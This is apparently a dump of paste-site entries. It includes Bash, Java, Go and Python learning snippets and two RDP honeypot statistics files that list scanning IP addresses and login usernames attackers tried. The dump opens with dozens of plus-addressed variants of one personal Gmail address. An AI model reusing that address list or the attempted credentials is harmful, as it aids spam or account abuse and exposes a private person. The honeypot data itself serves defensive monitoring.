<a href=""mailto:sanusilamidosanusidirect+8684@gmail.com"">sanusilamidosanusidirect+8684@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+31682@gmail.com"">sanusilamidosanusidirect+31682@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+22815@gmail.com"">sanusilamidosanusidirect+22815@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+13465@gmail.com"">sanusilamidosanusidirect+13465@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+22020@gmail.com"">sanusilamidosanusidirect+22020@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+4482@gmail.com"">sanusilamidosanusidirect+4482@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+12662@gmail.com"">sanusilamidosanusidirect+12662@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+14974@gmail.com"">sanusilamidosanusidirect+14974@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+26462@gmail.com"">sanusilamidosanusidirect+26462@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+11640@gmail.com"">sanusilamidosanusidirect+11640@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+17487@gmail.com"">sanusilamidosanusidirect+17487@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+12445@gmail.com"">sanusilamidosanusidirect+12445@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+22268@gmail.com"">sanusilamidosanusidirect+22268@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+2492@gmail.com"">sanusilamidosanusidirect+2492@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+16972@gmail.com"">sanusilamidosanusidirect+16972@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+7539@gmail.com"">sanusilamidosanusidirect+7539@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+6149@gmail.com"">sanusilamidosanusidirect+6149@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+21809@gmail.com"">sanusilamidosanusidirect+21809@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+1747@gmail.com"">sanusilamidosanusidirect+1747@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+23488@gmail.com"">sanusilamidosanusidirect+23488@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+23338@gmail.com"">sanusilamidosanusidirect+23338@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+15148@gmail.com"">sanusilamidosanusidirect+15148@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+15234@gmail.com"">sanusilamidosanusidirect+15234@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+29352@gmail.com"">sanusilamidosanusidirect+29352@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+12796@gmail.com"">sanusilamidosanusidirect+12796@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+23070@gmail.com"">sanusilamidosanusidirect+23070@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+29352@gmail.com"">sanusilamidosanusidirect+29352@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+16673@gmail.com"">sanusilamidosanusidirect+16673@gmail.com</a>
<a href=""mailto:sanusilamidosanusidirect+2014@gmail.com"">sanusilamidosanusidirect+2014@gmail.com</a>"
Bw8DQAdE,test1,kuroshan1104,Bash,Tuesday 4th of July 2023 07:48:26 PM CDT,"#!/bin/bash

# Función para calcular el factorial de un número
function calcular_factorial() {
    read -p ""Ingresa un número: "" numero

    factorial=1
    for ((i=1; i<=numero; i++))
    do
        factorial=$((factorial * i))
    done

    echo ""El factorial de $numero es: $factorial""
}

# Función para calcular la raíz cuadrada de dos números
function calcular_raiz_cuadrada() {
    read -p ""Ingresa el primer número: "" numero1
    read -p ""Ingresa el segundo número: "" numero2

    raiz1=$(echo ""scale=2; sqrt($numero1)"" | bc)
    raiz2=$(echo ""scale=2; sqrt($numero2)"" | bc)

    echo ""La raíz cuadrada de $numero1 es: $raiz1""
    echo ""La raíz cuadrada de $numero2 es: $raiz2""
}

# Menú principal
while true; do
    echo ""=== MENU ===""
    echo ""a. Calcular factorial de un número""
    echo ""b. Calcular raíz cuadrada de dos números""
    echo ""q. Salir""
    read -p ""Elige una opción: "" opcion

    case $opcion in
        a) calcular_factorial ;;
        b) calcular_raiz_cuadrada ;;
        q) break ;;
        *) echo ""Opción inválida"";;
    esac

    echo """"
done
"
x1CP2sJf,Day 12 samples,HarrJ,Java,Tuesday 4th of July 2023 07:33:19 PM CDT,"public class Day12A {
    public static void main(String[] args) {
        int i = 1, n = 5;
        
        do {
            System.out.println(""do while: "" + i);
            i++;
        } while (i <= n);
        i = 1;
        while (i <= n) {
            System.out.println(""while: "" + i);
            i++;
        }
        i = 1;
        for (int j = i; j <= n; j++) {
            System.out.println(""for: "" + j);
        }
        
        // i5 n0
        // i1 n1
    }
}

//------**********-------------


public class Day12B {
    public static void main(String[] args) {
        double[] numbers = {9.81, 42, 299.1, -1, 273};
        double sum = 0;
        
        for (double number : numbers) {
            System.out.println(""+ "" + number);
            sum += number;
        }
        System.out.println(""= "" + sum);
        
        System.out.println(""*** for loop version ***"");
        
        double[] numbers2 = {12, 44, 3.75, -4.44, 33};
        sum = 0;
        for (int i = 0; i < numbers2.length; i++) {
            double number = numbers2[i];
            sum += number;
            if (i < (numbers2.length - 1)) {
                System.out.print(number + "" + "");
            } else {
                System.out.print(number + "" = "");
            }
        }
        System.out.println(sum);
    }
}



//------**********-------------

import java.util.Scanner;

public class Day12C {
    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        double newNumber = 0;
        double total = 0;
        //we are limited with what we have discussed
        System.out.println(""addition(type 0 to end)"");
        
        do {            
            System.out.print(""+ "");
            newNumber = sc.nextDouble();
            total += newNumber;
            System.out.println(""= "" + total);
        } while (newNumber != 0);
    }
}
//------**********-------------
public class Day12D {
    
    public static void main(String[] args) {
        //para magamit si display method, gagawa tayo ng instance
        // ng class na ito
        Day12D callMe = new Day12D();
        callMe.display();
        
        //kapag static wala na initialization sa kapwa nya static
        myMethod();
    }
    
    void display() {
        Day12AccessTest2 callTest2 = new Day12AccessTest2();
        //import galing week1training package
        System.out.println(""Hello World!""); 
        System.out.println(""from this folder "" + callTest2.bookTitle4);
        System.out.println(""from this folder "" + callTest2.bookTitle5);
        System.out.println(""from this folder "" + callTest2.bookTitle6);
    }
    
    static void myMethod() {
        System.out.println(""This is a print from a static method"");
    }
}
//------**********-------------

public class Day12AccessTest2 {
    private String bookTitle3 = ""Jurassic Park"";
    public String bookTitle4 = ""The Andromeda Strain"";
    String bookTitle5 = ""Harry Potter"";
    protected String bookTitle6 = ""The Hobbit"";
}"
xmjjXQse,Untitled,DenCoder618,Go,Tuesday 4th of July 2023 07:21:24 PM CDT,"package MTL

import (
	""encoding/csv""
	""errors""
	""fmt""
	""github.com/kak-tus/nan""
	""golang.org/x/text/encoding/charmap""
	""io""
	""os""
	""reflect""
	""strconv""
	""strings""
	""time""
)

var (
	NullStrType  = reflect.TypeOf(nan.NullString{})
	NullIntType  = reflect.TypeOf(nan.NullInt{})
	NullTimeType = reflect.TypeOf(nan.NullTime{})
)

type Row struct {
	Code                      nan.NullString
	Number                    nan.NullInt
	TransactionGroupID        nan.NullInt
	TransactionNumber         nan.NullInt
	AuthorizationNumber       nan.NullInt
	TransactionPairNumber     nan.NullInt
	TransactionTypeBO         nan.NullString
	TransactionTypeFE         nan.NullString
	AccountNumber             nan.NullString
	CardNumber                nan.NullString
	LocalDateTime             nan.NullTime
	TransactionDateTime       nan.NullTime
	TransactionDirection      nan.NullString
	TransactionCurrency       nan.NullInt
	SettlementCurrency        nan.NullInt
	AccountCurrency           nan.NullInt
	TransactionAmount         nan.NullInt
	SettlementAmount          nan.NullInt
	AccountAmount             nan.NullInt
	MerchantID                nan.NullString
	MerchantName              nan.NullString
	MerchantLocation          nan.NullString
	TransactionCountry        nan.NullString
	TransactionState          nan.NullString
	TransactionCity           nan.NullString
	TransactionPostalCode     nan.NullString
	TerminalID                nan.NullString
	AuthorizationApprovalCode nan.NullString
	EffectiveDate             nan.NullTime
	SettlementDate            nan.NullTime
	CorrespondingAccount      nan.NullString
	MerchantCategoryCode      nan.NullString
	AcquirerReferenceNumber   nan.NullInt
	RetrievalReferenceNumber  nan.NullString
	TransactionChannel        nan.NullString
	AuthorizationCondition    nan.NullString
	Description               nan.NullString
	ExtendedTransactionCity   nan.NullString
	TermNum                   nan.NullString
	AuthorizationData         nan.NullString // nan.NullInt
	ServiceID                 nan.NullString
	AdditionalData            nan.NullString
}

type Mtl []Row

func parseRow(arr []string) (Row, error) {
	row := Row{}
	rowValues := reflect.ValueOf(&row).Elem()
	//ut := reflect.TypeOf(row).Elem()

	for i, value := range arr {
		if value == """" {
			continue
		}

		fieldValue := rowValues.Field(i)
		// validate fieldValue
		if !(fieldValue.IsValid() && fieldValue.CanSet()) {
			return Row{}, errors.New(""can't validate field: "" + fieldValue.Type().Name())
		}
		// parse value
		fmt.Println(fieldValue.Kind(), fieldValue.Type().Name())

		switch fieldValue.Type() {
		case NullStrType:
			fieldValue.Set(reflect.ValueOf(nan.String(value)))
		case NullIntType:
			intValue, err := strconv.Atoi(value)
			if err != nil {
				return Row{}, err
			}
			fieldValue.Set(reflect.ValueOf(nan.Int(intValue)))
		case NullTimeType:
			fieldValue.Set(reflect.ValueOf(nan.Time(time.Now())))
		default:
			return Row{}, errors.New(""wtf, your field's Kind is "" + fieldValue.Type().Name())
		}
		//	TODO: one fieldValue.Set(reflect.ValueOf for any type (after switch)
		//  TODO: validation
	}

	return row, nil
}

func parseMtlFile(path string) (Mtl, error) {
	content, err := readFileWin1251(path)
	if err != nil {
		return nil, err
	}

	r := csv.NewReader(strings.NewReader(content))
	r.Comma = ';'
	r.LazyQuotes = true
	r.FieldsPerRecord = -1

	records, err := r.ReadAll()
	if err != nil {
		return nil, err
	}

	for i, line := range records {
		if i == 0 {
			continue
		}
		row, err := parseRow(line)
		if err != nil {
			return nil, err
		}
		fmt.Println(len(line), line)
		fmt.Printf(""%+v\n"", row)
	}

	// var to store file rows
	var mtl Mtl

	return mtl, nil
}

func readFileWin1251(path string) (string, error) {
	// Декодировка в UTF-8
	file, err := os.Open(path)
	if err != nil {
		return """", err
	}

	defer func(f *os.File) {
		err := f.Close()
		if err != nil {
			panic(err)
		}
	}(file)

	decoder := charmap.Windows1251.NewDecoder()
	reader := decoder.Reader(file)
	bytes, err := io.ReadAll(reader)
	if err != nil {
		panic(err)
	}

	return string(bytes), nil
}

func TestMtlParser() {
	path := ""source/MTL20200807_0003.0001""

	_, err := parseMtlFile(path)
	if err != nil {
		panic(err)
	}
}
"
84kGyyPv,dir con python,teslariu,Python,Tuesday 4th of July 2023 07:19:02 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
from datetime import datetime
from tabulate import tabulate  # biblioteca externa, pip install tabulate para instalarla


archivos = 0
directorios = 0

# creo la tabla vacia
# formato de la tabla
# si es un archivo:    <fecha y hora>       <tamaño> <nombre>
# si es un directorio: <fecha y hora>  DIR           <nombre>
tabla = []

# escaneo el directorio y leo los datos
for item in os.scandir(os.getcwd()):
    if item.is_file():
        archivos += 1
        nombre = item.name
        
        # leo la info del archivo
        info = item.stat()
        
        # leo el tamaño del archivo
        tam = info.st_size
        
        # doy formato al tamaño:
        if tam < 1024:
            tam = f""{tam} B""
        
        elif 1024 <= tam <1024**2:
            tam = f""{tam/1024:.1f} KB""
            
        else:
            tam = f""{tam/1024**2:.1f} MB""
        
        # leo fecha y hora del ultima modificacion
        modif = datetime.utcfromtimestamp(info.st_mtime).strftime('%d/%m/%Y %H:%M')
        
        # agrego el dato a la tabla
        tabla.append([modif,"""",tam,nombre])
        
        
    elif item.is_dir():
        directorios += 1
        nombre = item.name
        
        # leo fecha y hora del ultima modificacion
        modif = datetime.utcfromtimestamp(info.st_mtime).strftime('%d/%m/%Y %H:%M')
        
        # agrego el dato a la tabla
        tabla.append([modif,""<DIR>"","""",nombre])

print(f""Directorio: {os.getcwd()}\n"")

print(tabulate(
        tabla,
        tablefmt = ""plain"",
        colalign = [""center"",""center"", ""right"", ""left""],
    )
)
           
print(f""\n\n\t\t{archivos} archivos"")
print(f""\t\t{directorios} directorios"")        
        
            
            
        
        
        
        
        
"
9QXZGXq4,2023-07-04_stats.json,rdp_snitch,JSON,Tuesday 4th of July 2023 07:18:25 PM CDT,"{
  ""ip"": {
    ""69.58.124.234"": 177,
    ""36.108.169.132"": 81,
    ""120.27.12.65"": 3,
    ""150.230.79.119"": 66,
    ""92.204.139.79"": 126,
    ""185.66.228.185"": 78,
    ""167.94.112.148"": 9,
    ""20.42.101.211"": 147,
    ""110.39.186.237"": 57,
    ""46.10.214.186"": 102,
    ""120.71.0.5"": 84,
    ""51.75.160.42"": 6,
    ""162.245.238.122"": 30,
    ""125.74.93.228"": 129,
    ""114.217.18.245"": 72,
    ""168.138.149.190"": 36,
    ""45.55.128.69"": 3,
    ""192.99.110.133"": 18,
    ""120.132.17.153"": 36,
    ""123.28.12.177"": 9,
    ""147.78.47.51"": 3,
    ""167.94.146.59"": 3,
    ""87.251.75.145"": 9,
    ""178.21.163.70"": 6,
    ""172.105.53.82"": 6,
    ""164.92.158.134"": 3,
    ""201.93.165.53"": 18,
    ""31.43.185.32"": 24,
    ""185.170.144.3"": 6,
    ""31.41.244.113"": 6,
    ""192.53.115.78"": 3,
    ""121.130.197.200"": 6,
    ""85.53.127.115"": 9,
    ""118.70.102.3"": 6,
    ""43.153.216.55"": 6,
    ""87.251.75.120"": 3,
    ""103.195.236.213"": 39,
    ""188.121.99.151"": 15,
    ""112.5.87.34"": 3,
    ""81.68.252.203"": 6,
    ""45.119.81.119"": 3,
    ""213.6.148.83"": 3,
    ""80.82.68.31"": 549,
    ""192.99.0.188"": 3,
    ""39.104.21.190"": 21,
    ""141.98.82.22"": 3,
    ""191.101.174.18"": 3,
    ""36.137.91.143"": 30,
    ""141.98.81.34"": 6,
    ""217.133.16.32"": 15,
    ""118.91.178.54"": 30,
    ""79.124.62.106"": 3,
    ""45.93.20.135"": 12,
    ""14.97.25.30"": 30,
    ""198.235.24.217"": 9,
    ""104.152.52.133"": 3,
    ""87.251.75.64"": 3,
    ""62.122.184.168"": 12,
    ""62.122.184.166"": 12,
    ""87.251.64.110"": 6,
    ""74.124.24.238"": 3,
    ""43.239.223.100"": 75,
    ""62.122.184.165"": 6,
    ""201.22.58.119"": 3,
    ""91.240.118.133"": 12,
    ""191.101.174.13"": 3,
    ""152.89.198.133"": 6,
    ""198.235.24.249"": 9,
    ""185.156.72.30"": 3
  },
  ""asn"": {
    ""AS32899"": 177,
    ""AS137695"": 165,
    ""AS37963"": 24,
    ""AS31898"": 102,
    ""AS398108"": 126,
    ""AS201689"": 78,
    ""AS148997"": 9,
    ""AS8075"": 147,
    ""AS38264"": 57,
    ""AS8866"": 102,
    ""AS16276"": 27,
    ""AS27323"": 30,
    ""AS141998"": 129,
    ""AS4134"": 72,
    ""AS14061"": 6,
    ""AS140292"": 36,
    ""AS45899"": 9,
    ""AS209588"": 12,
    ""AS398705"": 3,
    ""AS208091"": 15,
    ""AS21419"": 6,
    ""AS63949"": 9,
    ""AS27699"": 18,
    ""AS211736"": 24,
    ""AS48080"": 12,
    ""AS57678"": 6,
    ""AS4766"": 6,
    ""AS12479"": 9,
    ""AS18403"": 6,
    ""AS132203"": 6,
    ""AS140827"": 39,
    ""AS202468"": 15,
    ""AS9808"": 33,
    ""AS45090"": 6,
    ""AS131386"": 3,
    ""AS12975"": 3,
    ""AS202425"": 549,
    ""AS32780"": 6,
    ""AS8612"": 15,
    ""AS18002"": 30,
    ""AS207812"": 3,
    ""AS57523"": 60,
    ""AS45820"": 30,
    ""AS396982"": 18,
    ""AS14987"": 3,
    ""AS13354"": 3,
    ""AS135942"": 75,
    ""AS18881"": 3,
    ""AS61432"": 3
  },
  ""isp"": {
    ""Bresco Broadband"": 177,
    ""CHINATELECOM Xinjiang Wulumuqi MAN network"": 165,
    ""Addresses CNNIC"": 39,
    ""Oracle Corporation"": 102,
    ""GoDaddy.com, LLC"": 126,
    ""Lamerd Information & Communication Technology Co., ltd"": 78,
    ""KTB COMPUTER SERVICES COMPANY LIMITED"": 9,
    ""Microsoft Corporation"": 147,
    ""Wateen Telecom Limited"": 57,
    ""Vivacom Bulgaria EAD"": 102,
    ""OVH SAS"": 27,
    ""Wowrack.com"": 30,
    ""China Telecom"": 129,
    ""Chinanet"": 72,
    ""DigitalOcean, LLC"": 6,
    ""VietNam Post and Telecom Corporation"": 9,
    ""Flyservers S.A."": 12,
    ""Censys, Inc."": 3,
    ""XHOST-INTERNET-SOLUTIONS"": 15,
    ""Pishtaze E Jadid Infomration Company"": 6,
    ""Akamai Technologies"": 6,
    ""Vivo"": 21,
    ""FOP Dmytro Nedilskyi"": 24,
    ""Dmitriy Panchenko"": 12,
    ""Cat Technologies Co. Limited"": 6,
    ""Akamai Technologies, Inc."": 3,
    ""Korea Telecom"": 6,
    ""Uni2 1"": 9,
    ""FPT Telecom Company"": 6,
    ""Aceville Pte.ltd"": 6,
    ""AZ Viet NAM Communications Technology Company Limited"": 39,
    ""Noyan Abr Arvan Co. ( Private Joint Stock)"": 15,
    ""China Mobile"": 33,
    ""EuroNet Internet"": 6,
    ""Long Van System Solution"": 3,
    ""Palestine Telecommunications Company"": 3,
    ""IP Volume inc"": 549,
    ""Hangzhou Alibaba Advertising Co"": 21,
    ""Hosting Services"": 6,
    ""Tiscali Italia SpA"": 15,
    ""WORLDPHONE"": 30,
    ""DM AUTO EOOD"": 3,
    ""Chang Way Technologies Co. Limited"": 60,
    ""Ttsl-isp Division"": 30,
    ""Google LLC"": 18,
    ""Rethem Hosting LLC"": 3,
    ""zColo"": 3,
    ""VCIC"": 75,
    ""TOV VAIZ PARTNER"": 3
  },
  ""org"": {
    ""Bresco Broadband"": 177,
    ""Chinanet ZJ"": 81,
    ""Aliyun Computing Co., LTD"": 24,
    ""Oracle Cloud Infrastructure (sa-saopaulo-1)"": 102,
    ""Unknown"": 294,
    ""KTB COMPUTER SERVICES COMPANY LIMITED"": 9,
    ""Microsoft Azure Cloud (eastus)"": 147,
    ""Wateen Telecom Limited"": 57,
    ""Bulgarian Telecommunications Company Plc"": 102,
    ""Chinanet XJ"": 84,
    ""OVH Ltd"": 6,
    ""Wowrack.com"": 30,
    ""Chinanet GS"": 129,
    ""Chinanet JS"": 72,
    ""Digital Ocean"": 3,
    ""AVAST Software"": 18,
    ""Vietnam Posts and Telecommunications Group"": 9,
    ""Flyservers S.A"": 9,
    ""Censys, Inc."": 3,
    ""Xhost Internet Solutions"": 21,
    ""Linode"": 6,
    ""DigitalOcean, LLC"": 3,
    ""TELEF\ufffdNICA BRASIL S.A"": 21,
    ""FOP Dmytro Nedilskyi"": 24,
    ""Xhostis"": 6,
    ""Red Bytes LLC"": 6,
    ""Linode, LLC"": 3,
    ""Kornet"": 6,
    ""Vietnam Internet Network Information Center"": 6,
    ""DULIEUAZ"": 39,
    ""Noyan Abr Arvan Co. ( Private Joint Stock)"": 15,
    ""China Mobile Communications Corporation"": 33,
    ""Euronet Internet BV"": 6,
    ""Palestine Telecommunications Company"": 3,
    ""IP Volume inc"": 549,
    ""OVH Hosting, Inc."": 3,
    ""Vdsline"": 3,
    ""Express Technologies Ltd"": 6,
    ""Tiscali SpA"": 15,
    ""Internet Solutions & Innovations LTD"": 3,
    ""Starcrecium Limited"": 18,
    ""Tata Teleservices LTD Cdma"": 30,
    ""Palo Alto Networks, Inc"": 18,
    ""Rethem Hosting LLC"": 3,
    ""Chang Way Technologies Co. Limited"": 42,
    ""zColo"": 3,
    ""KDATA Company Limited"": 75,
    ""TOV VAIZ PARTNER"": 3
  },
  ""regionName"": {
    ""Ohio"": 177,
    ""Zhejiang"": 81,
    ""Shandong"": 3,
    ""Sao Paulo"": 120,
    ""Virginia"": 273,
    ""Tehran"": 99,
    ""Bangkok"": 9,
    ""Punjab"": 57,
    ""Sofia-Capital"": 102,
    ""Xinjiang Uyghur Autonomous Region"": 84,
    ""England"": 6,
    ""Illinois"": 33,
    ""Gansu"": 129,
    ""Jiangsu"": 72,
    ""New Jersey"": 9,
    ""Quebec"": 21,
    ""Beijing"": 57,
    ""Hanoi"": 15,
    ""North Holland"": 576,
    ""Hesse"": 3,
    ""Maharashtra"": 6,
    ""Kyiv City"": 27,
    ""St.-Petersburg"": 6,
    ""North West"": 9,
    ""Seoul"": 6,
    ""Andalusia"": 9,
    ""Ho Chi Minh"": 117,
    ""Guangdong"": 33,
    ""Shanghai"": 6,
    ""Gaza"": 3,
    ""Provincia de Panama"": 3,
    ""Drenthe"": 6,
    ""Lombardy"": 15,
    ""Tamil Nadu"": 30,
    ""English River"": 3,
    ""Moscow"": 66,
    ""Haryana"": 30,
    ""California"": 18,
    ""Texas"": 3,
    ""Parana"": 3
  },
  ""country"": {
    ""United States"": 513,
    ""China"": 465,
    ""Brazil"": 123,
    ""Iran"": 99,
    ""Thailand"": 9,
    ""Pakistan"": 57,
    ""Bulgaria"": 102,
    ""United Kingdom"": 6,
    ""Canada"": 21,
    ""Vietnam"": 132,
    ""Netherlands"": 582,
    ""Germany"": 3,
    ""India"": 66,
    ""Ukraine"": 27,
    ""Russia"": 72,
    ""Singapore"": 9,
    ""South Korea"": 6,
    ""Spain"": 9,
    ""Palestine"": 3,
    ""Panama"": 3,
    ""Italy"": 15,
    ""Seychelles"": 3
  },
  ""account"": {
    ""142.93.8.59"": 1158,
    ""hello"": 990,
    ""Test"": 18,
    ""Administr"": 63,
    ""(empty)"": 12,
    ""Domain"": 60,
    ""dMQHVKwEQ"": 3,
    ""DPQCgs"": 3,
    ""CaUHRf"": 3,
    ""nmap"": 3,
    ""pyxfyu6y"": 3,
    ""rCwIpCgaP"": 3,
    ""TGqZrW"": 3,
    ""cWfaIB"": 3
  },
  ""keyboard"": {
    ""Unknown"": 2325
  },
  ""client_build"": {
    ""Unknown"": 2325
  },
  ""client_name"": {
    ""Unknown"": 2325
  },
  ""ip_type"": {
    ""Unknown"": 1215,
    ""hosting"": 345,
    ""mobile"": 711,
    ""hosting & proxy"": 24,
    ""proxy"": 30
  }
}"
arAkiXbt,2023-07-04_stats.json,rdp_snitch,JSON,Tuesday 4th of July 2023 07:16:08 PM CDT,"{
  ""ip"": {
    ""69.58.124.234"": 118,
    ""36.108.169.132"": 54,
    ""120.27.12.65"": 2,
    ""150.230.79.119"": 44,
    ""92.204.139.79"": 84,
    ""185.66.228.185"": 52,
    ""167.94.112.148"": 6,
    ""20.42.101.211"": 98,
    ""110.39.186.237"": 38,
    ""46.10.214.186"": 68,
    ""120.71.0.5"": 56,
    ""51.75.160.42"": 4,
    ""162.245.238.122"": 20,
    ""125.74.93.228"": 86,
    ""114.217.18.245"": 48,
    ""168.138.149.190"": 24,
    ""45.55.128.69"": 2,
    ""192.99.110.133"": 12,
    ""120.132.17.153"": 24,
    ""123.28.12.177"": 6,
    ""147.78.47.51"": 2,
    ""167.94.146.59"": 2,
    ""87.251.75.145"": 6,
    ""178.21.163.70"": 4,
    ""172.105.53.82"": 4,
    ""164.92.158.134"": 2,
    ""201.93.165.53"": 12,
    ""31.43.185.32"": 16,
    ""185.170.144.3"": 4,
    ""31.41.244.113"": 4,
    ""192.53.115.78"": 2,
    ""121.130.197.200"": 4,
    ""85.53.127.115"": 6,
    ""118.70.102.3"": 4,
    ""43.153.216.55"": 4,
    ""87.251.75.120"": 2,
    ""103.195.236.213"": 26,
    ""188.121.99.151"": 10,
    ""112.5.87.34"": 2,
    ""81.68.252.203"": 4,
    ""45.119.81.119"": 2,
    ""213.6.148.83"": 2,
    ""80.82.68.31"": 366,
    ""192.99.0.188"": 2,
    ""39.104.21.190"": 14,
    ""141.98.82.22"": 2,
    ""191.101.174.18"": 2,
    ""36.137.91.143"": 20,
    ""141.98.81.34"": 4,
    ""217.133.16.32"": 10,
    ""118.91.178.54"": 20,
    ""79.124.62.106"": 2,
    ""45.93.20.135"": 8,
    ""14.97.25.30"": 20,
    ""198.235.24.217"": 6,
    ""104.152.52.133"": 2,
    ""87.251.75.64"": 2,
    ""62.122.184.168"": 8,
    ""62.122.184.166"": 8,
    ""87.251.64.110"": 4,
    ""74.124.24.238"": 2,
    ""43.239.223.100"": 50,
    ""62.122.184.165"": 4,
    ""201.22.58.119"": 2,
    ""91.240.118.133"": 8,
    ""191.101.174.13"": 2,
    ""152.89.198.133"": 4,
    ""198.235.24.249"": 6,
    ""185.156.72.30"": 2
  },
  ""asn"": {
    ""AS32899"": 118,
    ""AS137695"": 110,
    ""AS37963"": 16,
    ""AS31898"": 68,
    ""AS398108"": 84,
    ""AS201689"": 52,
    ""AS148997"": 6,
    ""AS8075"": 98,
    ""AS38264"": 38,
    ""AS8866"": 68,
    ""AS16276"": 18,
    ""AS27323"": 20,
    ""AS141998"": 86,
    ""AS4134"": 48,
    ""AS14061"": 4,
    ""AS140292"": 24,
    ""AS45899"": 6,
    ""AS209588"": 8,
    ""AS398705"": 2,
    ""AS208091"": 10,
    ""AS21419"": 4,
    ""AS63949"": 6,
    ""AS27699"": 12,
    ""AS211736"": 16,
    ""AS48080"": 8,
    ""AS57678"": 4,
    ""AS4766"": 4,
    ""AS12479"": 6,
    ""AS18403"": 4,
    ""AS132203"": 4,
    ""AS140827"": 26,
    ""AS202468"": 10,
    ""AS9808"": 22,
    ""AS45090"": 4,
    ""AS131386"": 2,
    ""AS12975"": 2,
    ""AS202425"": 366,
    ""AS32780"": 4,
    ""AS8612"": 10,
    ""AS18002"": 20,
    ""AS207812"": 2,
    ""AS57523"": 40,
    ""AS45820"": 20,
    ""AS396982"": 12,
    ""AS14987"": 2,
    ""AS13354"": 2,
    ""AS135942"": 50,
    ""AS18881"": 2,
    ""AS61432"": 2
  },
  ""isp"": {
    ""Bresco Broadband"": 118,
    ""CHINATELECOM Xinjiang Wulumuqi MAN network"": 110,
    ""Addresses CNNIC"": 26,
    ""Oracle Corporation"": 68,
    ""GoDaddy.com, LLC"": 84,
    ""Lamerd Information & Communication Technology Co., ltd"": 52,
    ""KTB COMPUTER SERVICES COMPANY LIMITED"": 6,
    ""Microsoft Corporation"": 98,
    ""Wateen Telecom Limited"": 38,
    ""Vivacom Bulgaria EAD"": 68,
    ""OVH SAS"": 18,
    ""Wowrack.com"": 20,
    ""China Telecom"": 86,
    ""Chinanet"": 48,
    ""DigitalOcean, LLC"": 4,
    ""VietNam Post and Telecom Corporation"": 6,
    ""Flyservers S.A."": 8,
    ""Censys, Inc."": 2,
    ""XHOST-INTERNET-SOLUTIONS"": 10,
    ""Pishtaze E Jadid Infomration Company"": 4,
    ""Akamai Technologies"": 4,
    ""Vivo"": 14,
    ""FOP Dmytro Nedilskyi"": 16,
    ""Dmitriy Panchenko"": 8,
    ""Cat Technologies Co. Limited"": 4,
    ""Akamai Technologies, Inc."": 2,
    ""Korea Telecom"": 4,
    ""Uni2 1"": 6,
    ""FPT Telecom Company"": 4,
    ""Aceville Pte.ltd"": 4,
    ""AZ Viet NAM Communications Technology Company Limited"": 26,
    ""Noyan Abr Arvan Co. ( Private Joint Stock)"": 10,
    ""China Mobile"": 22,
    ""EuroNet Internet"": 4,
    ""Long Van System Solution"": 2,
    ""Palestine Telecommunications Company"": 2,
    ""IP Volume inc"": 366,
    ""Hangzhou Alibaba Advertising Co"": 14,
    ""Hosting Services"": 4,
    ""Tiscali Italia SpA"": 10,
    ""WORLDPHONE"": 20,
    ""DM AUTO EOOD"": 2,
    ""Chang Way Technologies Co. Limited"": 40,
    ""Ttsl-isp Division"": 20,
    ""Google LLC"": 12,
    ""Rethem Hosting LLC"": 2,
    ""zColo"": 2,
    ""VCIC"": 50,
    ""TOV VAIZ PARTNER"": 2
  },
  ""org"": {
    ""Bresco Broadband"": 118,
    ""Chinanet ZJ"": 54,
    ""Aliyun Computing Co., LTD"": 16,
    ""Oracle Cloud Infrastructure (sa-saopaulo-1)"": 68,
    ""Unknown"": 196,
    ""KTB COMPUTER SERVICES COMPANY LIMITED"": 6,
    ""Microsoft Azure Cloud (eastus)"": 98,
    ""Wateen Telecom Limited"": 38,
    ""Bulgarian Telecommunications Company Plc"": 68,
    ""Chinanet XJ"": 56,
    ""OVH Ltd"": 4,
    ""Wowrack.com"": 20,
    ""Chinanet GS"": 86,
    ""Chinanet JS"": 48,
    ""Digital Ocean"": 2,
    ""AVAST Software"": 12,
    ""Vietnam Posts and Telecommunications Group"": 6,
    ""Flyservers S.A"": 6,
    ""Censys, Inc."": 2,
    ""Xhost Internet Solutions"": 14,
    ""Linode"": 4,
    ""DigitalOcean, LLC"": 2,
    ""TELEF\ufffdNICA BRASIL S.A"": 14,
    ""FOP Dmytro Nedilskyi"": 16,
    ""Xhostis"": 4,
    ""Red Bytes LLC"": 4,
    ""Linode, LLC"": 2,
    ""Kornet"": 4,
    ""Vietnam Internet Network Information Center"": 4,
    ""DULIEUAZ"": 26,
    ""Noyan Abr Arvan Co. ( Private Joint Stock)"": 10,
    ""China Mobile Communications Corporation"": 22,
    ""Euronet Internet BV"": 4,
    ""Palestine Telecommunications Company"": 2,
    ""IP Volume inc"": 366,
    ""OVH Hosting, Inc."": 2,
    ""Vdsline"": 2,
    ""Express Technologies Ltd"": 4,
    ""Tiscali SpA"": 10,
    ""Internet Solutions & Innovations LTD"": 2,
    ""Starcrecium Limited"": 12,
    ""Tata Teleservices LTD Cdma"": 20,
    ""Palo Alto Networks, Inc"": 12,
    ""Rethem Hosting LLC"": 2,
    ""Chang Way Technologies Co. Limited"": 28,
    ""zColo"": 2,
    ""KDATA Company Limited"": 50,
    ""TOV VAIZ PARTNER"": 2
  },
  ""regionName"": {
